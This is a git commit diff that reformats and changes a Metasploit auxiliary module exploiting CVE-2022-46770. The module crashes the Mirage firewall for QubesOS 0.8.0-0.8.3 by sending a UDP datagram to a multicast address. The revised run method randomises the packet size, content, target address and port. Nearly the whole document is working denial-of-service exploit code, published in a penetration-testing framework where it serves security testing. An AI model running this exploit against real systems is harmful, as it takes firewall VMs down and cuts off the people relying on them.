551edbe0d10b7a4bf82cf8e14b6c22e36f2e01dd
Krzysztof Burghardt <krzysztof@burghardt.pl>
2022-12-09 17:20:13 +0100

    Review and lint fixes

--- modules/auxiliary/dos/mirageos/qubes_mirage_firewall_dos.rb
+++ modules/auxiliary/dos/mirageos/qubes_mirage_firewall_dos.rb
@@ -8,36 +8,49 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Dos
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Mirage firewall for QubesOS 0.8.0-0.8.3 Denial of Service (DoS) Exploit',
-      'Description'    => %q{
+    super(
+      update_info(
+        info,
+        'Name' => 'Mirage firewall for QubesOS 0.8.0-0.8.3 Denial of Service (DoS) Exploit',
+        'Description' => %q{
           This module allows remote attackers to cause a denial of service (DoS)
           in Mirage firewall for QubesOS 0.8.0-0.8.3 via a specifically crafted UDP request.
-      },
-      'Author'         => 'Krzysztof Burghardt <krzysztof@burghardt.pl>',
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
+        },
+        'Author' => 'Krzysztof Burghardt <krzysztof@burghardt.pl>',
+        'License' => MSF_LICENSE,
+        'References' => [
           [ 'CVE', '2022-46770' ],
           [ 'URL', 'https://mirage.io/blog/MSA03' ],
           [ 'URL', 'https://github.com/mirage/qubes-mirage-firewall/issues/166' ],
         ],
-      'DisclosureDate' => '2022-12-04',
-    ))
+        'Notes' => {
+          'Stability' => [CRASH_SERVICE_DOWN],
+          'Reliability' => [IOC_IN_LOGS, PHYSICAL_EFFECTS],
+          'SideEffects' => [UNRELIABLE_SESSION]
+        },
+        'DisclosureDate' => '2022-12-04'
+      )
+    )
 
     register_options(
-    [
-      Opt::RPORT(5353),
-      Opt::RHOST('239.255.255.250'),
-    ])
+      [
+        OptAddress.new('RHOST', [ false, 'Target address (Default: random)' ]),
+        OptPort.new('RPORT', [ false, 'Target port (Default: random)' ]),
+      ]
+    )
+
+    deregister_options('RHOSTS')
   end
 
   def run
-    connect_udp
+    rhost = datastore['RHOST'] || [239, 255, Random.new.rand(255), Random.new.rand(255)].join('.')
+    rport = datastore['RPORT'] || Random.new.rand(65535)
+    connect_udp(true, 'RHOST' => rhost, 'RPORT' => rport)
 
-	pkt = 'a'*607
-	print_status("Sending datagram to #{rhost}...")
-	udp_sock.put(pkt)
+    size = Random.new.rand(336...1472)
+    pkt = Random.new.bytes(size)
+    print_status("Sending random datagram of #{size} bytes to #{rhost}:#{rport}...")
+    udp_sock.put(pkt)
 
     disconnect_udp
   end
